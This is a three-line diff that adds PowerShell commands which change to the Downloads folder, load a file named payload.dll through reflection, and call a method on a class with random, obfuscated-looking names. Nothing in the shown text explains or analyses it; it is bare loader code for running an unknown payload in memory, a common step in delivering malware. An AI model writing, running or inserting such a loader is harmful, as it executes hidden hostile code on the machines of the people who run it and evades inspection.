@@ -1,0 +1,3 @@
+cd ~\Downloads\
+[Reflection.Assembly]::LoadFile($PWD.Path+"\payload.dll")
+[Wrtujmagvrnztygh.Ygixyijah]::Nvcdgmtvexbfarjclwnzn()
